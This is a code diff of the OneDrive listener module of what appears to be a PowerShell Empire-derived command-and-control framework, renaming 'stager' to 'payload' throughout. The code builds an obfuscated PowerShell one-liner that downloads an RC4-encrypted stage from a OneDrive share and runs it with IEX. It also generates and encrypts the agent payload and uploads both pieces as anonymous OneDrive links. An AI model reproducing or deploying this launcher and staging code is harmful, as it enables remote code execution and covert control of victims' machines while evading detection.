@@ -164,7 +164,7 @@ class Listener:
 
         return True
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', payloadRetries='0', language=None, safeChecks='', listenerName=None):
         if not language:
             print helpers.color("[!] listeners/onedrive generate_launcher(): No language specified")
 
@@ -256,7 +256,7 @@ class Listener:
                 launcher += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')
 
                 launcher += helpers.randomize_capitalization("$data=$wc.DownloadData('")
-                launcher += self.mainMenu.listeners.activeListeners[listenerName]['stager_url']
+                launcher += self.mainMenu.listeners.activeListeners[listenerName]['payload_url']
                 launcher += helpers.randomize_capitalization("');$iv=$data[0..3];$data=$data[4..$data.length];")
 
                 launcher += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
@@ -276,13 +276,13 @@ class Listener:
         else:
             print helpers.color("[!] listeners/onedrive generate_launcher(): invalid listener name")
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None, token=None):
+    def generate_payload(self, listenerOptions, encode=False, encrypt=True, language=None, token=None):
         """
-        Generate the stager code
+        Generate the payload code
         """
 
         if not language:
-            print helpers.color("[!] listeners/onedrive generate_stager(): no language specified")
+            print helpers.color("[!] listeners/onedrive generate_payload(): no language specified")
             return None
 
         staging_key = listenerOptions['StagingKey']['Value']
@@ -293,36 +293,36 @@ class Listener:
         agent_delay = listenerOptions['DefaultDelay']['Value']
 
         if language.lower() == 'powershell':
-            f = open("%s/data/agent/stagers/onedrive.ps1" % self.mainMenu.installPath)
-            stager = f.read()
+            f = open("%s/data/agent/payloads/onedrive.ps1" % self.mainMenu.installPath)
+            payload = f.read()
             f.close()
 
-            stager = stager.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
-            stager = stager.replace('REPLACE_STAGING_KEY', staging_key)
-            stager = stager.replace("REPLACE_TOKEN", token)
-            stager = stager.replace("REPLACE_POLLING_INTERVAL", str(agent_delay))
+            payload = payload.replace("REPLACE_STAGING_FOLDER", "%s/%s" % (base_folder, staging_folder))
+            payload = payload.replace('REPLACE_STAGING_KEY', staging_key)
+            payload = payload.replace("REPLACE_TOKEN", token)
+            payload = payload.replace("REPLACE_POLLING_INTERVAL", str(agent_delay))
 
             if working_hours != "":
-                stager = stager.replace("REPLACE_WORKING_HOURS", working_hours)
+                payload = payload.replace("REPLACE_WORKING_HOURS", working_hours)
 
-            randomized_stager = ''
+            randomized_payload = ''
 
-            for line in stager.split("\n"):
+            for line in payload.split("\n"):
                 line = line.strip()
 
                 if not line.startswith("#"):
                     if "\"" not in line:
-                        randomized_stager += helpers.randomize_capitalization(line)
+                        randomized_payload += helpers.randomize_capitalization(line)
                     else:
-                        randomized_stager += line
+                        randomized_payload += line
 
             if encode:
-                return helpers.enc_powershell(randomized_stager)
+                return helpers.enc_powershell(randomized_payload)
             elif encrypt:
                 RC4IV = os.urandom(4)
-                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_stager)
+                return RC4IV + encryption.rc4(RC4IV+staging_key, randomized_payload)
             else:
-                return randomized_stager
+                return randomized_payload
 
         else:
             print helpers.color("[!] Python agent not available for Onedrive")
@@ -556,7 +556,7 @@ class Listener:
                     dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
 
         def upload_launcher():
-            ps_launcher = self.mainMenu.stagers.generate_launcher(listener_name, language='powershell', encode=False, userAgent='none', proxy='none', proxyCreds='none')
+            ps_launcher = self.mainMenu.payloads.generate_launcher(listener_name, language='powershell', encode=False, userAgent='none', proxy='none', proxyCreds='none')
 
             r = s.put("%s/drive/root:/%s/%s/%s:/content" %(base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"),
                         data=ps_launcher, headers={"Content-Type": "text/plain"})
@@ -568,21 +568,21 @@ class Listener:
                             headers={"Content-Type": "application/json"})
                 launcher_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
 
-        def upload_stager():
-            ps_stager = self.generate_stager(listenerOptions=listener_options, language='powershell', token=token['access_token'])
+        def upload_payload():
+            ps_payload = self.generate_payload(listenerOptions=listener_options, language='powershell', token=token['access_token'])
             r = s.put("%s/drive/root:/%s/%s/%s:/content" % (base_url, base_folder, staging_folder, "STAGE0-PS.txt"),
-                        data=ps_stager, headers={"Content-Type": "application/octet-stream"})
+                        data=ps_payload, headers={"Content-Type": "application/octet-stream"})
             if r.status_code == 201 or r.status_code == 200:
                 item = r.json()
                 r = s.post("%s/drive/items/%s/createLink" % (base_url, item['id']),
                             json={"scope": "anonymous", "type": "view"},
                             headers={"Content-Type": "application/json"})
-                stager_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
+                payload_url = "https://api.onedrive.com/v1.0/shares/%s/driveitem/content" % r.json()['shareId']
                 #Different domain for some reason?
-                self.mainMenu.listeners.activeListeners[listener_name]['stager_url'] = stager_url
+                self.mainMenu.listeners.activeListeners[listener_name]['payload_url'] = payload_url
 
             else:
-                print helpers.color("[!] Something went wrong uploading stager")
+                print helpers.color("[!] Something went wrong uploading payload")
                 message = r.content
                 signal = json.dumps({
                     'print' : True,
@@ -629,10 +629,10 @@ class Listener:
         setup_folders()
 
         while True:
-            #Wait until invader is aware the listener is running, so we can save our refresh token and stager URL
+            #Wait until invader is aware the listener is running, so we can save our refresh token and payload URL
             try:
                 if listener_name in self.mainMenu.listeners.activeListeners.keys():
-                    upload_stager()
+                    upload_payload()
                     upload_launcher()
                     break
                 else:
@@ -652,7 +652,7 @@ class Listener:
                         'message': message
                     })
                     dispatcher.send(signal, sender="listeners/onedrive/{}".format(listener_name))
-                    upload_stager()
+                    upload_payload()
                 if token['update']:
                     self.mainMenu.listeners.update_listener_options(listener_name, "RefreshToken", token['refresh_token'])
                     token['update'] = False
